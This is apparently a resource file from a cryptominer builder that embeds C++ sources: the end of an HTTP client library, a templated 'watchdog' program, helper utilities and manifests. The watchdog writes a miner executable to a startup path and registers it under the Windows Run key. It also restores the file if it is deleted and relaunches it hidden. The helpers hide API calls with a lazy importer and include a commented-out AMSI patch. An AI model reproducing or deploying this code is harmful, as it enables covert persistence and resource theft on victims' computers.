inline Result Client::Head(const std::string &amp;path, const Headers &amp;headers) {
  return cli_-&gt;Head(path, headers);
}

inline Result Client::Post(const std::string &amp;path) { return cli_-&gt;Post(path); }
inline Result Client::Post(const std::string &amp;path, const Headers &amp;headers) {
  return cli_-&gt;Post(path, headers);
}
inline Result Client::Post(const std::string &amp;path, const char *body,
                           size_t content_length,
                           const std::string &amp;content_type) {
  return cli_-&gt;Post(path, body, content_length, content_type);
}
inline Result Client::Post(const std::string &amp;path, const Headers &amp;headers,
                           const char *body, size_t content_length,
                           const std::string &amp;content_type) {
  return cli_-&gt;Post(path, headers, body, content_length, content_type);
}
inline Result Client::Post(const std::string &amp;path, const Headers &amp;headers,
                           const char *body, size_t content_length,
                           const std::string &amp;content_type, Progress progress) {
  return cli_-&gt;Post(path, headers, body, content_length, content_type,
                    progress);
}
inline Result Client::Post(const std::string &amp;path, const std::string &amp;body,
                           const std::string &amp;content_type) {
  return cli_-&gt;Post(path, body, content_type);
}
inline Result Client::Post(const std::string &amp;path, const std::string &amp;body,
                           const std::string &amp;content_type, Progress progress) {
  return cli_-&gt;Post(path, body, content_type, progress);
}
inline Result Client::Post(const std::string &amp;path, const Headers &amp;headers,
                           const std::string &amp;body,
                           const std::string &amp;content_type) {
  return cli_-&gt;Post(path, headers, body, content_type);
}
inline Result Client::Post(const std::string &amp;path, const Headers &amp;headers,
                           const std::string &amp;body,
                           const std::string &amp;content_type, Progress progress) {
  return cli_-&gt;Post(path, headers, body, content_type, progress);
}
inline Result Client::Post(const std::string &amp;path, size_t content_length,
                           ContentProvider content_provider,
                           const std::string &amp;content_type) {
  return cli_-&gt;Post(path, content_length, std::move(content_provider),
                    content_type);
}
inline Result Client::Post(const std::string &amp;path,
                           ContentProviderWithoutLength content_provider,
                           const std::string &amp;content_type) {
  return cli_-&gt;Post(path, std::move(content_provider), content_type);
}
inline Result Client::Post(const std::string &amp;path, const Headers &amp;headers,
                           size_t content_length,
                           ContentProvider content_provider,
                           const std::string &amp;content_type) {
  return cli_-&gt;Post(path, headers, content_length, std::move(content_provider),
                    content_type);
}
inline Result Client::Post(const std::string &amp;path, const Headers &amp;headers,
                           ContentProviderWithoutLength content_provider,
                           const std::string &amp;content_type) {
  return cli_-&gt;Post(path, headers, std::move(content_provider), content_type);
}
inline Result Client::Post(const std::string &amp;path, const Params &amp;params) {
  return cli_-&gt;Post(path, params);
}
inline Result Client::Post(const std::string &amp;path, const Headers &amp;headers,
                           const Params &amp;params) {
  return cli_-&gt;Post(path, headers, params);
}
inline Result Client::Post(const std::string &amp;path, const Headers &amp;headers,
                           const Params &amp;params, Progress progress) {
  return cli_-&gt;Post(path, headers, params, progress);
}
inline Result Client::Post(const std::string &amp;path,
                           const MultipartFormDataItems &amp;items) {
  return cli_-&gt;Post(path, items);
}
inline Result Client::Post(const std::string &amp;path, const Headers &amp;headers,
                           const MultipartFormDataItems &amp;items) {
  return cli_-&gt;Post(path, headers, items);
}
inline Result Client::Post(const std::string &amp;path, const Headers &amp;headers,
                           const MultipartFormDataItems &amp;items,
                           const std::string &amp;boundary) {
  return cli_-&gt;Post(path, headers, items, boundary);
}
inline Result
Client::Post(const std::string &amp;path, const Headers &amp;headers,
             const MultipartFormDataItems &amp;items,
             const MultipartFormDataProviderItems &amp;provider_items) {
  return cli_-&gt;Post(path, headers, items, provider_items);
}
inline Result Client::Put(const std::string &amp;path) { return cli_-&gt;Put(path); }
inline Result Client::Put(const std::string &amp;path, const char *body,
                          size_t content_length,
                          const std::string &amp;content_type) {
  return cli_-&gt;Put(path, body, content_length, content_type);
}
inline Result Client::Put(const std::string &amp;path, const Headers &amp;headers,
                          const char *body, size_t content_length,
                          const std::string &amp;content_type) {
  return cli_-&gt;Put(path, headers, body, content_length, content_type);
}
inline Result Client::Put(const std::string &amp;path, const Headers &amp;headers,
                          const char *body, size_t content_length,
                          const std::string &amp;content_type, Progress progress) {
  return cli_-&gt;Put(path, headers, body, content_length, content_type, progress);
}
inline Result Client::Put(const std::string &amp;path, const std::string &amp;body,
                          const std::string &amp;content_type) {
  return cli_-&gt;Put(path, body, content_type);
}
inline Result Client::Put(const std::string &amp;path, const std::string &amp;body,
                          const std::string &amp;content_type, Progress progress) {
  return cli_-&gt;Put(path, body, content_type, progress);
}
inline Result Client::Put(const std::string &amp;path, const Headers &amp;headers,
                          const std::string &amp;body,
                          const std::string &amp;content_type) {
  return cli_-&gt;Put(path, headers, body, content_type);
}
inline Result Client::Put(const std::string &amp;path, const Headers &amp;headers,
                          const std::string &amp;body,
                          const std::string &amp;content_type, Progress progress) {
  return cli_-&gt;Put(path, headers, body, content_type, progress);
}
inline Result Client::Put(const std::string &amp;path, size_t content_length,
                          ContentProvider content_provider,
                          const std::string &amp;content_type) {
  return cli_-&gt;Put(path, content_length, std::move(content_provider),
                   content_type);
}
inline Result Client::Put(const std::string &amp;path,
                          ContentProviderWithoutLength content_provider,
                          const std::string &amp;content_type) {
  return cli_-&gt;Put(path, std::move(content_provider), content_type);
}
inline Result Client::Put(const std::string &amp;path, const Headers &amp;headers,
                          size_t content_length,
                          ContentProvider content_provider,
                          const std::string &amp;content_type) {
  return cli_-&gt;Put(path, headers, content_length, std::move(content_provider),
                   content_type);
}
inline Result Client::Put(const std::string &amp;path, const Headers &amp;headers,
                          ContentProviderWithoutLength content_provider,
                          const std::string &amp;content_type) {
  return cli_-&gt;Put(path, headers, std::move(content_provider), content_type);
}
inline Result Client::Put(const std::string &amp;path, const Params &amp;params) {
  return cli_-&gt;Put(path, params);
}
inline Result Client::Put(const std::string &amp;path, const Headers &amp;headers,
                          const Params &amp;params) {
  return cli_-&gt;Put(path, headers, params);
}
inline Result Client::Put(const std::string &amp;path, const Headers &amp;headers,
                          const Params &amp;params, Progress progress) {
  return cli_-&gt;Put(path, headers, params, progress);
}
inline Result Client::Put(const std::string &amp;path,
                          const MultipartFormDataItems &amp;items) {
  return cli_-&gt;Put(path, items);
}
inline Result Client::Put(const std::string &amp;path, const Headers &amp;headers,
                          const MultipartFormDataItems &amp;items) {
  return cli_-&gt;Put(path, headers, items);
}
inline Result Client::Put(const std::string &amp;path, const Headers &amp;headers,
                          const MultipartFormDataItems &amp;items,
                          const std::string &amp;boundary) {
  return cli_-&gt;Put(path, headers, items, boundary);
}
inline Result
Client::Put(const std::string &amp;path, const Headers &amp;headers,
            const MultipartFormDataItems &amp;items,
            const MultipartFormDataProviderItems &amp;provider_items) {
  return cli_-&gt;Put(path, headers, items, provider_items);
}
inline Result Client::Patch(const std::string &amp;path) {
  return cli_-&gt;Patch(path);
}
inline Result Client::Patch(const std::string &amp;path, const char *body,
                            size_t content_length,
                            const std::string &amp;content_type) {
  return cli_-&gt;Patch(path, body, content_length, content_type);
}
inline Result Client::Patch(const std::string &amp;path, const char *body,
                            size_t content_length,
                            const std::string &amp;content_type,
                            Progress progress) {
  return cli_-&gt;Patch(path, body, content_length, content_type, progress);
}
inline Result Client::Patch(const std::string &amp;path, const Headers &amp;headers,
                            const char *body, size_t content_length,
                            const std::string &amp;content_type) {
  return cli_-&gt;Patch(path, headers, body, content_length, content_type);
}
inline Result Client::Patch(const std::string &amp;path, const Headers &amp;headers,
                            const char *body, size_t content_length,
                            const std::string &amp;content_type,
                            Progress progress) {
  return cli_-&gt;Patch(path, headers, body, content_length, content_type,
                     progress);
}
inline Result Client::Patch(const std::string &amp;path, const std::string &amp;body,
                            const std::string &amp;content_type) {
  return cli_-&gt;Patch(path, body, content_type);
}
inline Result Client::Patch(const std::string &amp;path, const std::string &amp;body,
                            const std::string &amp;content_type,
                            Progress progress) {
  return cli_-&gt;Patch(path, body, content_type, progress);
}
inline Result Client::Patch(const std::string &amp;path, const Headers &amp;headers,
                            const std::string &amp;body,
                            const std::string &amp;content_type) {
  return cli_-&gt;Patch(path, headers, body, content_type);
}
inline Result Client::Patch(const std::string &amp;path, const Headers &amp;headers,
                            const std::string &amp;body,
                            const std::string &amp;content_type,
                            Progress progress) {
  return cli_-&gt;Patch(path, headers, body, content_type, progress);
}
inline Result Client::Patch(const std::string &amp;path, size_t content_length,
                            ContentProvider content_provider,
                            const std::string &amp;content_type) {
  return cli_-&gt;Patch(path, content_length, std::move(content_provider),
                     content_type);
}
inline Result Client::Patch(const std::string &amp;path,
                            ContentProviderWithoutLength content_provider,
                            const std::string &amp;content_type) {
  return cli_-&gt;Patch(path, std::move(content_provider), content_type);
}
inline Result Client::Patch(const std::string &amp;path, const Headers &amp;headers,
                            size_t content_length,
                            ContentProvider content_provider,
                            const std::string &amp;content_type) {
  return cli_-&gt;Patch(path, headers, content_length, std::move(content_provider),
                     content_type);
}
inline Result Client::Patch(const std::string &amp;path, const Headers &amp;headers,
                            ContentProviderWithoutLength content_provider,
                            const std::string &amp;content_type) {
  return cli_-&gt;Patch(path, headers, std::move(content_provider), content_type);
}
inline Result Client::Delete(const std::string &amp;path) {
  return cli_-&gt;Delete(path);
}
inline Result Client::Delete(const std::string &amp;path, const Headers &amp;headers) {
  return cli_-&gt;Delete(path, headers);
}
inline Result Client::Delete(const std::string &amp;path, const char *body,
                             size_t content_length,
                             const std::string &amp;content_type) {
  return cli_-&gt;Delete(path, body, content_length, content_type);
}
inline Result Client::Delete(const std::string &amp;path, const char *body,
                             size_t content_length,
                             const std::string &amp;content_type,
                             Progress progress) {
  return cli_-&gt;Delete(path, body, content_length, content_type, progress);
}
inline Result Client::Delete(const std::string &amp;path, const Headers &amp;headers,
                             const char *body, size_t content_length,
                             const std::string &amp;content_type) {
  return cli_-&gt;Delete(path, headers, body, content_length, content_type);
}
inline Result Client::Delete(const std::string &amp;path, const Headers &amp;headers,
                             const char *body, size_t content_length,
                             const std::string &amp;content_type,
                             Progress progress) {
  return cli_-&gt;Delete(path, headers, body, content_length, content_type,
                      progress);
}
inline Result Client::Delete(const std::string &amp;path, const std::string &amp;body,
                             const std::string &amp;content_type) {
  return cli_-&gt;Delete(path, body, content_type);
}
inline Result Client::Delete(const std::string &amp;path, const std::string &amp;body,
                             const std::string &amp;content_type,
                             Progress progress) {
  return cli_-&gt;Delete(path, body, content_type, progress);
}
inline Result Client::Delete(const std::string &amp;path, const Headers &amp;headers,
                             const std::string &amp;body,
                             const std::string &amp;content_type) {
  return cli_-&gt;Delete(path, headers, body, content_type);
}
inline Result Client::Delete(const std::string &amp;path, const Headers &amp;headers,
                             const std::string &amp;body,
                             const std::string &amp;content_type,
                             Progress progress) {
  return cli_-&gt;Delete(path, headers, body, content_type, progress);
}
inline Result Client::Options(const std::string &amp;path) {
  return cli_-&gt;Options(path);
}
inline Result Client::Options(const std::string &amp;path, const Headers &amp;headers) {
  return cli_-&gt;Options(path, headers);
}

inline bool Client::send(Request &amp;req, Response &amp;res, Error &amp;error) {
  return cli_-&gt;send(req, res, error);
}

inline Result Client::send(const Request &amp;req) { return cli_-&gt;send(req); }

inline void Client::stop() { cli_-&gt;stop(); }

inline std::string Client::host() const { return cli_-&gt;host(); }

inline int Client::port() const { return cli_-&gt;port(); }

inline size_t Client::is_socket_open() const { return cli_-&gt;is_socket_open(); }

inline socket_t Client::socket() const { return cli_-&gt;socket(); }

inline void
Client::set_hostname_addr_map(std::map&lt;std::string, std::string&gt; addr_map) {
  cli_-&gt;set_hostname_addr_map(std::move(addr_map));
}

inline void Client::set_default_headers(Headers headers) {
  cli_-&gt;set_default_headers(std::move(headers));
}

inline void Client::set_header_writer(
    std::function&lt;ssize_t(Stream &amp;, Headers &amp;)&gt; const &amp;writer) {
  cli_-&gt;set_header_writer(writer);
}

inline void Client::set_address_family(int family) {
  cli_-&gt;set_address_family(family);
}

inline void Client::set_tcp_nodelay(bool on) { cli_-&gt;set_tcp_nodelay(on); }

inline void Client::set_socket_options(SocketOptions socket_options) {
  cli_-&gt;set_socket_options(std::move(socket_options));
}

inline void Client::set_connection_timeout(time_t sec, time_t usec) {
  cli_-&gt;set_connection_timeout(sec, usec);
}

inline void Client::set_read_timeout(time_t sec, time_t usec) {
  cli_-&gt;set_read_timeout(sec, usec);
}

inline void Client::set_write_timeout(time_t sec, time_t usec) {
  cli_-&gt;set_write_timeout(sec, usec);
}

inline void Client::set_basic_auth(const std::string &amp;username,
                                   const std::string &amp;password) {
  cli_-&gt;set_basic_auth(username, password);
}
inline void Client::set_bearer_token_auth(const std::string &amp;token) {
  cli_-&gt;set_bearer_token_auth(token);
}
#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
inline void Client::set_digest_auth(const std::string &amp;username,
                                    const std::string &amp;password) {
  cli_-&gt;set_digest_auth(username, password);
}
#endif

inline void Client::set_keep_alive(bool on) { cli_-&gt;set_keep_alive(on); }
inline void Client::set_follow_location(bool on) {
  cli_-&gt;set_follow_location(on);
}

inline void Client::set_url_encode(bool on) { cli_-&gt;set_url_encode(on); }

inline void Client::set_compress(bool on) { cli_-&gt;set_compress(on); }

inline void Client::set_decompress(bool on) { cli_-&gt;set_decompress(on); }

inline void Client::set_interface(const std::string &amp;intf) {
  cli_-&gt;set_interface(intf);
}

inline void Client::set_proxy(const std::string &amp;host, int port) {
  cli_-&gt;set_proxy(host, port);
}
inline void Client::set_proxy_basic_auth(const std::string &amp;username,
                                         const std::string &amp;password) {
  cli_-&gt;set_proxy_basic_auth(username, password);
}
inline void Client::set_proxy_bearer_token_auth(const std::string &amp;token) {
  cli_-&gt;set_proxy_bearer_token_auth(token);
}
#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
inline void Client::set_proxy_digest_auth(const std::string &amp;username,
                                          const std::string &amp;password) {
  cli_-&gt;set_proxy_digest_auth(username, password);
}
#endif

#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
inline void Client::enable_server_certificate_verification(bool enabled) {
  cli_-&gt;enable_server_certificate_verification(enabled);
}

inline void Client::enable_server_hostname_verification(bool enabled) {
  cli_-&gt;enable_server_hostname_verification(enabled);
}

inline void Client::set_server_certificate_verifier(
    std::function&lt;bool(SSL *ssl)&gt; verifier) {
  cli_-&gt;set_server_certificate_verifier(verifier);
}
#endif

inline void Client::set_logger(Logger logger) {
  cli_-&gt;set_logger(std::move(logger));
}

#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
inline void Client::set_ca_cert_path(const std::string &amp;ca_cert_file_path,
                                     const std::string &amp;ca_cert_dir_path) {
  cli_-&gt;set_ca_cert_path(ca_cert_file_path, ca_cert_dir_path);
}

inline void Client::set_ca_cert_store(X509_STORE *ca_cert_store) {
  if (is_ssl_) {
    static_cast&lt;SSLClient &amp;&gt;(*cli_).set_ca_cert_store(ca_cert_store);
  } else {
    cli_-&gt;set_ca_cert_store(ca_cert_store);
  }
}

inline void Client::load_ca_cert_store(const char *ca_cert, std::size_t size) {
  set_ca_cert_store(cli_-&gt;create_ca_cert_store(ca_cert, size));
}

inline long Client::get_openssl_verify_result() const {
  if (is_ssl_) {
    return static_cast&lt;SSLClient &amp;&gt;(*cli_).get_openssl_verify_result();
  }
  return -1; // NOTE: -1 doesn't match any of X509_V_ERR_???
}

inline SSL_CTX *Client::ssl_context() const {
  if (is_ssl_) { return static_cast&lt;SSLClient &amp;&gt;(*cli_).ssl_context(); }
  return nullptr;
}
#endif

// ----------------------------------------------------------------------------

} // namespace httplib

#if defined(_WIN32) &amp;&amp; defined(CPPHTTPLIB_USE_POLL)
#undef poll
#endif

#endif // CPPHTTPLIB_HTTPLIB_H
</value>
  </data>
  <data name="watchdog.cpp" xml:space="preserve">
    <value>#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;mutex&gt; 
#include &lt;string&gt;
#include &lt;filesystem&gt;
#include "common_util.h"
#include &lt;shlobj.h&gt;
#include &lt;iostream&gt;
#include &lt;vector&gt;
#include "lib/lazy_importer.hpp"

#define MAX_LENGTH 500


int main (){

    std::string StartUpBasePath = getenv("$StartUpBasePath");


    std::string startupPath = "$startupPath";
    std::string MonerPath = "$MonerPath";
    std::string MonerMutex = "$MinerMutex";
    std::string xmMutex = "DDRTHyper";
        std::string ServiceName = "$AppName";
    
    std::string StartUpFullPath = StartUpBasePath + "\\" + startupPath;
    std::vector&lt;char&gt; minerBytes =  readAllBytes(StartUpFullPath);

    
    // create mutex 
    HANDLE mutex = CreateMutexW(nullptr, FALSE, L"$WatchdogMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS){
        return 0;
    }
    
    #if true
        // Call function with desired values.
    if (!AddRegistryValue(StartUpFullPath, ServiceName.c_str()))
    {

    }else{
        printf("Registry value added successfully.\n");
    }
    
    


    #endif
    




    while (true){

        Sleep(10000);
       
        if (!fileExists(StartUpFullPath))
        {
            writeAllBytes(StartUpFullPath, minerBytes);
        }
        
        if (!mutexExists(xmMutex)&amp;&amp; !mutexExists(MonerMutex))
        {
            runProcess(StartUpFullPath.c_str());            
        }
        

    
    }

    LI_FN(CloseHandle)(mutex);
    return 0;

}</value>
  </data>
  <data name="common_util.cpp" xml:space="preserve">
    <value>#include "common_util.h"
#include &lt;windows.h&gt;
#include &lt;iostream&gt;
#include &lt;string&gt;
#include &lt;vector&gt;
#include &lt;libloaderapi.h&gt;
#include &lt;filesystem&gt;
#include &lt;wchar.h&gt;
#include "lib/lazy_importer.hpp"
#include &lt;tchar.h&gt;
#include &lt;fstream&gt;
#include &lt;vector&gt;
#include &lt;iostream&gt;
#include &lt;fstream&gt;
#include &lt;string&gt;
#include &lt;vector&gt;
#include &lt;mutex&gt;
#include &lt;sys/stat.h&gt; // POSIX
#ifdef _WIN32
    #include &lt;direct.h&gt; // Windows _mkdir
    #define mkdir(path, mode) _mkdir(path)
#else
    #include &lt;unistd.h&gt;
#endif

#include &lt;sstream&gt;
#include &lt;iostream&gt;
#include &lt;string&gt;
#include &lt;algorithm&gt;
#include &lt;cctype&gt;
#include &lt;vector&gt;

bool DisableSleep(){
 return false;
}

void run_program(const char* programPath, const char* cmdLine){
      STARTUPINFO si;
    PROCESS_INFORMATION pi;
    memset(&amp;si, 0, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);

    memset(&amp;pi, 0, sizeof(PROCESS_INFORMATION));

    if (!LI_FN(CreateProcessA)(
            programPath,
            (LPTSTR)cmdLine,
        nullptr, //lpProcessAttributes
        nullptr, //lpThreadAttributes
            FALSE, //bInheritHandles
            CREATE_SUSPENDED || HIDE_WINDOW, //dwCreationFlags
        nullptr, //lpEnvironment 
        nullptr, //lpCurrentDirectory
            &amp;si, //lpStartupInfo
            &amp;pi //lpProcessInformation
        ))
    {
        std::cerr &lt;&lt; "[ERROR] CreateProcess failed, Error = " &lt;&lt; std::hex &lt;&lt; GetLastError() &lt;&lt; "\n";
    }
    // AmsiPatcher patcher(pi.dwProcessId);
    // patcher.PatchAmsi();
    LI_FN(ResumeThread)(pi.hThread);
}

bool runProcess(const std::string&amp; commandLine) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Create the process
    BOOL success = CreateProcessA(
        nullptr,               // No module name (use command line)
    (LPSTR)commandLine.c_str(), // Command line
        nullptr, nullptr,      // Process/thread security
        FALSE,                 // No handle inheritance
        CREATE_NO_WINDOW,      // No console window
        nullptr, nullptr,      // Use parent's environment and directory
        &amp;si, &amp;pi
    );

    if (!success) {
        std::wcerr &lt;&lt; L"CreateProcess failed with error " &lt;&lt; GetLastError() &lt;&lt; "\n";
        return false;
    }

    // Wait for the process to finish (optional)
    WaitForSingleObject(pi.hProcess, INFINITE);

    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &amp;exitCode);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    std::wcout &lt;&lt; L"Process exited with code " &lt;&lt; exitCode &lt;&lt; "\n";
    return (exitCode == 0);
}



char manualXOR(char a, char b) {
    char result = 0;
    for (int i = 0; i &lt; 8; ++i) {
        result |= (((a &gt;&gt; i) &amp; 1) != ((b &gt;&gt; i) &amp; 1)) &lt;&lt; i;
    }
    return result;
}

void StringToWString(std::wstring &amp;ws, const std::string &amp;s)
{
    std::wstring wsTmp(s.begin(), s.end());

    ws = wsTmp;
}

std::wstring ConvertToWide(LPCTSTR cmdLine)
{
#ifdef UNICODE
    return std::wstring(cmdLine); // already wide
#else
    int len = MultiByteToWideChar(CP_ACP, 0, cmdLine, -1, nullptr, 0);
    std::wstring result(len, 0);
    MultiByteToWideChar(CP_ACP, 0, cmdLine, -1, &amp;result[0], len);
    return result;
#endif
}


std::vector&lt;uint8_t&gt; toUTF16LE(const std::wstring&amp; input) {
    std::vector&lt;uint8_t&gt; utf16le;
    for (wchar_t wc : input) {
        uint16_t code_unit = static_cast&lt;uint16_t&gt;(wc); // assumes wchar_t is 16-bit (Windows)
        utf16le.push_back(static_cast&lt;uint8_t&gt;(code_unit &amp; 0xFF));        // low byte
        utf16le.push_back(static_cast&lt;uint8_t&gt;((code_unit &gt;&gt; 8) &amp; 0xFF)); // high byte
    }
    return utf16le;
}

void writeAllBytes(const std::string&amp; filename, const std::vector&lt;char&gt;&amp; data) {
    std::ofstream outFile(filename, std::ios::binary);

    if (!outFile) {
        throw std::runtime_error("Could not open file for writing: " + filename);
    }

    outFile.write(data.data(), data.size());

    if (!outFile) {
        throw std::runtime_error("Failed to write all data to file: " + filename);
    }
}



std::vector&lt;char&gt; readAllBytes(const std::string&amp; filename) {
    std::ifstream file(filename, std::ios::binary);

    if (!file) {
        throw std::runtime_error("Could not open file: " + filename);
    }

    // Determine file size
    file.seekg(0, std::ios::end);
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    // Allocate buffer
    std::vector&lt;char&gt; buffer(size);

    // Read content
    if (!file.read(buffer.data(), size)) {
        throw std::runtime_error("Failed to read the complete file");
    }

    return buffer;
}

bool fileExists(const std::string&amp; filename) {
    std::ifstream file(filename);
    return file.good();
}

DWORD splitFirstSpace(LPCTSTR str) {
    // Convert LPCTSTR to the appropriate string type based on _UNICODE or not.
#ifdef UNICODE
    std::wstring wstr(str);
#else
    std::string wstr(str);
#endif

    // Find the position of the first space in the string
    size_t pos;
#ifdef UNICODE
    pos = wstr.find(L' ');
#else
    pos = wstr.find(' ');
#endif

    // If there is no space, return the entire length of the string
    if (pos == std::wstring::npos) {
        return static_cast&lt;DWORD&gt;(wstr.length() * sizeof(WCHAR));
    }

    // Otherwise, return the length up to that space
#ifdef UNICODE
    return static_cast&lt;DWORD&gt;(wstr.substr(0, pos).length()* 2);
#else
    return static_cast&lt;DWORD&gt;(wstr.substr(0, pos).length() * sizeof(CHAR));
#endif
}

// Function to add/modify a string value in the Windows Registry.
bool AddRegistryValue(const std::string&amp; startupPath, const char* valueName) {
    HKEY hKey;
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    

    // Open or create the registry key
    if (LI_FN(RegOpenKeyExA)(HKEY_CURRENT_USER, regPath, 0, KEY_SET_VALUE, &amp;hKey) == ERROR_SUCCESS) {
        // Write the path to the registry
        if (LI_FN(RegSetValueExA)(hKey, valueName, 0, REG_SZ, 
                reinterpret_cast&lt;const BYTE*&gt;(startupPath.c_str()), 
                static_cast&lt;DWORD&gt;(startupPath.length() + 1)) == ERROR_SUCCESS) {
            std::cout &lt;&lt; "Successfully added to startup.\n";
        } else {
            std::cerr &lt;&lt; "Failed to set registry value.\n";
        }
        LI_FN(RegCloseKey)(hKey);
    } else {
        std::cerr &lt;&lt; "Failed to open registry key.\n";
        return false;
    }
    return true;
}


// Check if a directory exists
bool directoryExists(const std::string&amp; path) {
    struct stat info;
    return stat(path.c_str(), &amp;info) == 0 &amp;&amp; (info.st_mode &amp; S_IFDIR);
}

// Create a single directory
bool createDirectory(const std::string&amp; path) {
    return mkdir(path.c_str(), 0755) == 0 || errno == EEXIST;
}

// Split a string by backslash '\'
std::vector&lt;std::string&gt; splitPath(const std::string&amp; path) {
    std::vector&lt;std::string&gt; parts;
    std::string current;
    for (size_t i = 0; i &lt; path.size(); ++i) {
        if (path[i] == '\\') {
            if (!current.empty()) {
                parts.push_back(current);
                current.clear();
            }
        } else {
            current += path[i];
        }
    }
    if (!current.empty()) {
        parts.push_back(current);
    }
    return parts;
}

bool endsWithExe(const std::string&amp; path) {
    const std::string ext = ".exe";
    if (path.length() &gt;= ext.length()) {
        return path.compare(path.length() - ext.length(), ext.length(), ext) == 0;
    }
    return false;
}

bool createPathRecursively(std::string fullPath) {
    // If the path ends with .exe, strip the filename
    if (endsWithExe(fullPath)) {
        size_t lastSlash = fullPath.find_last_of("\\/");
        if (lastSlash != std::string::npos) {
            fullPath = fullPath.substr(0, lastSlash);  // Remove the file name
        }
    }

    std::vector&lt;std::string&gt; parts = splitPath(fullPath);
    std::string currentPath;

    // Handle drive letter like "C:"
    if (parts.size() &gt; 0 &amp;&amp; parts[0].size() == 2 &amp;&amp; parts[0][1] == ':') {
        currentPath = parts[0];
        parts.erase(parts.begin());
    }

    for (const auto&amp; part : parts) {
        if (!currentPath.empty() &amp;&amp; currentPath.back() != '\\') {
            currentPath += "\\";
        }
        currentPath += part;

        if (!directoryExists(currentPath)) {
            if (!createDirectory(currentPath)) {
                std::cerr &lt;&lt; "Failed to create: " &lt;&lt; currentPath &lt;&lt; "\n";
                return false;
            }
        }
    }

    return true;
}

bool InstallCheck(){
    return true;
}

bool mutexExists(const std::string&amp; name) {
    HANDLE hMutex = CreateMutexA(
        nullptr,     // default security
        FALSE,       // not initially owned
        name.c_str() // mutex name
    );

    if (hMutex == nullptr) {
        // Failed to create (bad permissions or name)
        return false;
    }

    bool alreadyExists = (GetLastError() == ERROR_ALREADY_EXISTS);

    // Clean up
    CloseHandle(hMutex);

    return alreadyExists;
}

bool IsAdmin(){
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY* sidAuth = NULL;
    HANDLE hToken = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &amp;hToken)){
        TOKEN_ELEVATION elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &amp;elevation, sizeof(elevation), &amp;cbSize)){
            isAdmin = elevation.TokenIsElevated;
        }
    }
    return isAdmin;
}


std::string toLower(const std::string&amp; str) {
    std::string result = str;
    std::transform(result.begin(), result.end(), result.begin(),
                   [](unsigned char c) { return std::tolower(c); });
    return result;
}


std::string normalizeSlashes(const std::string&amp; path) {
    std::string result = path;
    std::replace(result.begin(), result.end(), '\\', '/');
    return result;
}

std::string normalizePath(const std::string&amp; rawPath) {
    std::string path = normalizeSlashes(rawPath);
    std::vector&lt;std::string&gt; components;
    size_t start = 0;

    while (start &lt; path.size()) {
        size_t end = path.find('/', start);
        if (end == std::string::npos) end = path.size();
        std::string part = path.substr(start, end - start);

        if (part == "..") {
            if (!components.empty()) components.pop_back();  // Go up one level
        } else if (!part.empty() &amp;&amp; part != ".") {
            components.push_back(part);
        }
        start = end + 1;
    }

    std::string result;
    for (const auto&amp; comp : components) {
        result += "/" + comp;
    }

    return toLower(result.empty() ? "/" : result);
}

bool arePathsEqual(const char* path1, const std::string&amp; path2) {
    if (!path1) return false;
    std::string p1 = normalizePath(path1);
    std::string p2 = normalizePath(path2);
    return p1 == p2;
}</value>
  </data>
  <data name="common_util.h" xml:space="preserve">
    <value>#pragma once
#include &lt;iostream&gt;
#include &lt;filesystem&gt;
#include &lt;wchar.h&gt;
#include &lt;vector&gt;
#include &lt;string&gt;
#include &lt;winternl.h&gt;

bool DisableSleep();

void run_program(const char* programPath, const char* cmdLine);

bool runProcess(const std::string&amp; commandLine);

char manualXOR(char a, char b);

void StringToWString(std::wstring &amp;ws, const std::string &amp;s);

DWORD splitFirstSpace(LPCTSTR str);

std::wstring ConvertToWide(LPCTSTR cmdLine);

std::vector&lt;uint8_t&gt; toUTF16LE(const std::wstring&amp; input);

void writeAllBytes(const std::string&amp; filename, const std::vector&lt;char&gt;&amp; data);

std::vector&lt;char&gt; readAllBytes(const std::string&amp; filename);

bool fileExists(const std::string&amp; filename);

bool AddRegistryValue(const std::string &amp;startupPath, const char* valueName);


bool directoryExists(const std::string&amp; path);

bool createDirectory(const std::string&amp; path);

bool endsWithExe(const std::string&amp; path);

std::vector&lt;std::string&gt; splitPath(const std::string&amp; path);

bool createPathRecursively(std::string fullPath);

bool InstallCheck();

bool mutexExists(const std::string&amp; name);

bool IsAdmin();

std::string toLower(const std::string&amp; str);

std::string normalizeSlashes(const std::string&amp; path);
std::string normalizePath(const std::string&amp; rawPath);

bool arePathsEqual(const char* path1, const std::string&amp; path2);</value>
  </data>
  <data name="programManifest" xml:space="preserve">
    <value>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"&gt;
  &lt;trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"&gt;
    &lt;security&gt;
      &lt;requestedPrivileges&gt;
        &lt;requestedExecutionLevel level="requireAdministrator" uiAccess="$ProgramNeedsAdmin" /&gt;
      &lt;/requestedPrivileges&gt;
    &lt;/security&gt;
  &lt;/trustInfo&gt;
&lt;/assembly&gt;</value>
  </data>
  <data name="manifest.rc" xml:space="preserve">
    <value>#include "resource.h"
IDR_MANIFEST RT_MANIFEST "app.manifest"
</value>
  </data>
  <data name="app.manifest" xml:space="preserve">
    <value>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"&gt;
  &lt;trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"&gt;
    &lt;security&gt;
      &lt;requestedPrivileges&gt;
        &lt;requestedExecutionLevel level="$MANIFESTLEVEL" uiAccess="false" /&gt;
      &lt;/requestedPrivileges&gt;
    &lt;/security&gt;
  &lt;/trustInfo&gt;
